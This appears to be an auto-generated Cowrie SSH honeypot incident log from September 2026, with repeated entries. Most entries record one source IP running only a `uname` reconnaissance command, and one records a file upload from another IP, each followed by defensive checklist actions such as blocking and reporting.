### 🔴 HIGH · IR-c7bc04d8b3a1

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:19 |
| **Last Seen** | 2026-09-07 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:19:20` | `cowrie.session.connect` |
| `2026-09-07 20:19:20` | `cowrie.client.version` |
| `2026-09-07 20:19:20` | `cowrie.client.kex` |
| `2026-09-07 20:19:21` | `cowrie.login.success` |
| `2026-09-07 20:19:21` | `cowrie.session.params` |
| `2026-09-07 20:19:21` | `cowrie.command.input` |
| `2026-09-07 20:19:21` | `cowrie.log.closed` |
| `2026-09-07 20:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88c533d42db8

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:19 |
| **Last Seen** | 2026-09-07 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:19:45` | `cowrie.session.connect` |
| `2026-09-07 20:19:45` | `cowrie.client.version` |
| `2026-09-07 20:19:45` | `cowrie.client.kex` |
| `2026-09-07 20:19:46` | `cowrie.login.success` |
| `2026-09-07 20:19:47` | `cowrie.session.params` |
| `2026-09-07 20:19:47` | `cowrie.command.input` |
| `2026-09-07 20:19:47` | `cowrie.log.closed` |
| `2026-09-07 20:19:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88475aefd1df

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:20 |
| **Last Seen** | 2026-09-07 20:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:20:11` | `cowrie.session.connect` |
| `2026-09-07 20:20:11` | `cowrie.client.version` |
| `2026-09-07 20:20:11` | `cowrie.client.kex` |
| `2026-09-07 20:20:11` | `cowrie.login.success` |
| `2026-09-07 20:20:12` | `cowrie.session.params` |
| `2026-09-07 20:20:12` | `cowrie.command.input` |
| `2026-09-07 20:20:12` | `cowrie.log.closed` |
| `2026-09-07 20:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62aea23aec77

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:20 |
| **Last Seen** | 2026-09-07 20:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:20:36` | `cowrie.session.connect` |
| `2026-09-07 20:20:36` | `cowrie.client.version` |
| `2026-09-07 20:20:36` | `cowrie.client.kex` |
| `2026-09-07 20:20:37` | `cowrie.login.success` |
| `2026-09-07 20:20:37` | `cowrie.session.params` |
| `2026-09-07 20:20:37` | `cowrie.command.input` |
| `2026-09-07 20:20:38` | `cowrie.log.closed` |
| `2026-09-07 20:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5d42156da61

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:21 |
| **Last Seen** | 2026-09-07 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:21:02` | `cowrie.session.connect` |
| `2026-09-07 20:21:02` | `cowrie.client.version` |
| `2026-09-07 20:21:02` | `cowrie.client.kex` |
| `2026-09-07 20:21:02` | `cowrie.login.success` |
| `2026-09-07 20:21:03` | `cowrie.session.params` |
| `2026-09-07 20:21:03` | `cowrie.command.input` |
| `2026-09-07 20:21:03` | `cowrie.log.closed` |
| `2026-09-07 20:21:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2686f27839c2

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:21 |
| **Last Seen** | 2026-09-07 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:21:28` | `cowrie.session.connect` |
| `2026-09-07 20:21:28` | `cowrie.client.version` |
| `2026-09-07 20:21:28` | `cowrie.client.kex` |
| `2026-09-07 20:21:28` | `cowrie.login.success` |
| `2026-09-07 20:21:29` | `cowrie.session.params` |
| `2026-09-07 20:21:29` | `cowrie.command.input` |
| `2026-09-07 20:21:29` | `cowrie.log.closed` |
| `2026-09-07 20:21:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39a37800a4b8

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:21 |
| **Last Seen** | 2026-09-07 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:21:53` | `cowrie.session.connect` |
| `2026-09-07 20:21:53` | `cowrie.client.version` |
| `2026-09-07 20:21:53` | `cowrie.client.kex` |
| `2026-09-07 20:21:54` | `cowrie.login.success` |
| `2026-09-07 20:21:54` | `cowrie.session.params` |
| `2026-09-07 20:21:54` | `cowrie.command.input` |
| `2026-09-07 20:21:54` | `cowrie.log.closed` |
| `2026-09-07 20:21:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b29374920afe

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:22 |
| **Last Seen** | 2026-09-07 20:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:22:19` | `cowrie.session.connect` |
| `2026-09-07 20:22:19` | `cowrie.client.version` |
| `2026-09-07 20:22:19` | `cowrie.client.kex` |
| `2026-09-07 20:22:19` | `cowrie.login.success` |
| `2026-09-07 20:22:20` | `cowrie.session.params` |
| `2026-09-07 20:22:20` | `cowrie.command.input` |
| `2026-09-07 20:22:20` | `cowrie.log.closed` |
| `2026-09-07 20:22:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57fbbe4fb1bd

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:22 |
| **Last Seen** | 2026-09-07 20:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:22:45` | `cowrie.session.connect` |
| `2026-09-07 20:22:45` | `cowrie.client.version` |
| `2026-09-07 20:22:45` | `cowrie.client.kex` |
| `2026-09-07 20:22:45` | `cowrie.login.success` |
| `2026-09-07 20:22:46` | `cowrie.session.params` |
| `2026-09-07 20:22:46` | `cowrie.command.input` |
| `2026-09-07 20:22:46` | `cowrie.log.closed` |
| `2026-09-07 20:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d79ca8175f8

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:23 |
| **Last Seen** | 2026-09-07 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:23:10` | `cowrie.session.connect` |
| `2026-09-07 20:23:10` | `cowrie.client.version` |
| `2026-09-07 20:23:11` | `cowrie.client.kex` |
| `2026-09-07 20:23:11` | `cowrie.login.success` |
| `2026-09-07 20:23:12` | `cowrie.session.params` |
| `2026-09-07 20:23:12` | `cowrie.command.input` |
| `2026-09-07 20:23:12` | `cowrie.log.closed` |
| `2026-09-07 20:23:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46f2d0c975a8

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:23 |
| **Last Seen** | 2026-09-07 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:23:36` | `cowrie.session.connect` |
| `2026-09-07 20:23:36` | `cowrie.client.version` |
| `2026-09-07 20:23:36` | `cowrie.client.kex` |
| `2026-09-07 20:23:37` | `cowrie.login.success` |
| `2026-09-07 20:23:38` | `cowrie.session.params` |
| `2026-09-07 20:23:38` | `cowrie.command.input` |
| `2026-09-07 20:23:38` | `cowrie.log.closed` |
| `2026-09-07 20:23:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6317f860b1ec

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:24 |
| **Last Seen** | 2026-09-07 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:24:02` | `cowrie.session.connect` |
| `2026-09-07 20:24:02` | `cowrie.client.version` |
| `2026-09-07 20:24:02` | `cowrie.client.kex` |
| `2026-09-07 20:24:02` | `cowrie.login.success` |
| `2026-09-07 20:24:03` | `cowrie.session.params` |
| `2026-09-07 20:24:03` | `cowrie.command.input` |
| `2026-09-07 20:24:03` | `cowrie.log.closed` |
| `2026-09-07 20:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e008d4922132

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:24 |
| **Last Seen** | 2026-09-07 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:24:27` | `cowrie.session.connect` |
| `2026-09-07 20:24:27` | `cowrie.client.version` |
| `2026-09-07 20:24:27` | `cowrie.client.kex` |
| `2026-09-07 20:24:28` | `cowrie.login.success` |
| `2026-09-07 20:24:28` | `cowrie.session.params` |
| `2026-09-07 20:24:28` | `cowrie.command.input` |
| `2026-09-07 20:24:28` | `cowrie.log.closed` |
| `2026-09-07 20:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abeb59bbfd2e

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:24 |
| **Last Seen** | 2026-09-07 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:24:53` | `cowrie.session.connect` |
| `2026-09-07 20:24:53` | `cowrie.client.version` |
| `2026-09-07 20:24:53` | `cowrie.client.kex` |
| `2026-09-07 20:24:53` | `cowrie.login.success` |
| `2026-09-07 20:24:54` | `cowrie.session.params` |
| `2026-09-07 20:24:54` | `cowrie.command.input` |
| `2026-09-07 20:24:54` | `cowrie.log.closed` |
| `2026-09-07 20:24:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fcce8e301a0

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:25 |
| **Last Seen** | 2026-09-07 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:25:18` | `cowrie.session.connect` |
| `2026-09-07 20:25:18` | `cowrie.client.version` |
| `2026-09-07 20:25:18` | `cowrie.client.kex` |
| `2026-09-07 20:25:19` | `cowrie.login.success` |
| `2026-09-07 20:25:19` | `cowrie.session.params` |
| `2026-09-07 20:25:19` | `cowrie.command.input` |
| `2026-09-07 20:25:19` | `cowrie.log.closed` |
| `2026-09-07 20:25:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a3821a669f5

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:25 |
| **Last Seen** | 2026-09-07 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:25:43` | `cowrie.session.connect` |
| `2026-09-07 20:25:43` | `cowrie.client.version` |
| `2026-09-07 20:25:43` | `cowrie.client.kex` |
| `2026-09-07 20:25:44` | `cowrie.login.success` |
| `2026-09-07 20:25:44` | `cowrie.session.params` |
| `2026-09-07 20:25:44` | `cowrie.command.input` |
| `2026-09-07 20:25:44` | `cowrie.log.closed` |
| `2026-09-07 20:25:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-497bc3dd0927

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:26 |
| **Last Seen** | 2026-09-07 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:26:09` | `cowrie.session.connect` |
| `2026-09-07 20:26:09` | `cowrie.client.version` |
| `2026-09-07 20:26:09` | `cowrie.client.kex` |
| `2026-09-07 20:26:09` | `cowrie.login.success` |
| `2026-09-07 20:26:10` | `cowrie.session.params` |
| `2026-09-07 20:26:10` | `cowrie.command.input` |
| `2026-09-07 20:26:10` | `cowrie.log.closed` |
| `2026-09-07 20:26:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb3d39d076c3

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:26 |
| **Last Seen** | 2026-09-07 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:26:34` | `cowrie.session.connect` |
| `2026-09-07 20:26:34` | `cowrie.client.version` |
| `2026-09-07 20:26:34` | `cowrie.client.kex` |
| `2026-09-07 20:26:35` | `cowrie.login.success` |
| `2026-09-07 20:26:36` | `cowrie.session.params` |
| `2026-09-07 20:26:36` | `cowrie.command.input` |
| `2026-09-07 20:26:36` | `cowrie.log.closed` |
| `2026-09-07 20:26:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-855c4519fdb5

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:26 |
| **Last Seen** | 2026-09-07 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:26:59` | `cowrie.session.connect` |
| `2026-09-07 20:26:59` | `cowrie.client.version` |
| `2026-09-07 20:26:59` | `cowrie.client.kex` |
| `2026-09-07 20:27:00` | `cowrie.login.success` |
| `2026-09-07 20:27:01` | `cowrie.session.params` |
| `2026-09-07 20:27:01` | `cowrie.command.input` |
| `2026-09-07 20:27:01` | `cowrie.log.closed` |
| `2026-09-07 20:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-046b4a1fe97d

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:27 |
| **Last Seen** | 2026-09-07 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:27:24` | `cowrie.session.connect` |
| `2026-09-07 20:27:24` | `cowrie.client.version` |
| `2026-09-07 20:27:25` | `cowrie.client.kex` |
| `2026-09-07 20:27:25` | `cowrie.login.success` |
| `2026-09-07 20:27:26` | `cowrie.session.params` |
| `2026-09-07 20:27:26` | `cowrie.command.input` |
| `2026-09-07 20:27:26` | `cowrie.log.closed` |
| `2026-09-07 20:27:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01acd6c491a0

| Field | Detail |
|---|---|
| **Source IP** | `122.225.202[.]130` |
| **First Seen** | 2026-09-07 20:27 |
| **Last Seen** | 2026-09-07 20:29 |
| **Session Duration** | 84s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:27:38` | `cowrie.session.connect` |
| `2026-09-07 20:27:38` | `cowrie.client.version` |
| `2026-09-07 20:27:38` | `cowrie.client.kex` |
| `2026-09-07 20:27:39` | `cowrie.login.success` |
| `2026-09-07 20:29:01` | `cowrie.session.file_upload` |
| `2026-09-07 20:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.225.202[.]130` to AbuseIPDB if not already reported
- [ ] Block `122.225.202[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1be6ca9292ad

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:27 |
| **Last Seen** | 2026-09-07 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:27:50` | `cowrie.session.connect` |
| `2026-09-07 20:27:50` | `cowrie.client.version` |
| `2026-09-07 20:27:50` | `cowrie.client.kex` |
| `2026-09-07 20:27:50` | `cowrie.login.success` |
| `2026-09-07 20:27:51` | `cowrie.session.params` |
| `2026-09-07 20:27:51` | `cowrie.command.input` |
| `2026-09-07 20:27:51` | `cowrie.log.closed` |
| `2026-09-07 20:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fee136597e17

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:28 |
| **Last Seen** | 2026-09-07 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:28:16` | `cowrie.session.connect` |
| `2026-09-07 20:28:16` | `cowrie.client.version` |
| `2026-09-07 20:28:16` | `cowrie.client.kex` |
| `2026-09-07 20:28:16` | `cowrie.login.success` |
| `2026-09-07 20:28:17` | `cowrie.session.params` |
| `2026-09-07 20:28:17` | `cowrie.command.input` |
| `2026-09-07 20:28:17` | `cowrie.log.closed` |
| `2026-09-07 20:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5a17cce8fcd

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:28 |
| **Last Seen** | 2026-09-07 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:28:41` | `cowrie.session.connect` |
| `2026-09-07 20:28:41` | `cowrie.client.version` |
| `2026-09-07 20:28:41` | `cowrie.client.kex` |
| `2026-09-07 20:28:42` | `cowrie.login.success` |
| `2026-09-07 20:28:43` | `cowrie.session.params` |
| `2026-09-07 20:28:43` | `cowrie.command.input` |
| `2026-09-07 20:28:43` | `cowrie.log.closed` |
| `2026-09-07 20:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1748331c79d

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:29 |
| **Last Seen** | 2026-09-07 20:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:29:07` | `cowrie.session.connect` |
| `2026-09-07 20:29:07` | `cowrie.client.version` |
| `2026-09-07 20:29:07` | `cowrie.client.kex` |
| `2026-09-07 20:29:07` | `cowrie.login.success` |
| `2026-09-07 20:29:08` | `cowrie.session.params` |
| `2026-09-07 20:29:08` | `cowrie.command.input` |
| `2026-09-07 20:29:08` | `cowrie.log.closed` |
| `2026-09-07 20:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1114cdfda71

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:29 |
| **Last Seen** | 2026-09-07 20:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:29:32` | `cowrie.session.connect` |
| `2026-09-07 20:29:32` | `cowrie.client.version` |
| `2026-09-07 20:29:33` | `cowrie.client.kex` |
| `2026-09-07 20:29:33` | `cowrie.login.success` |
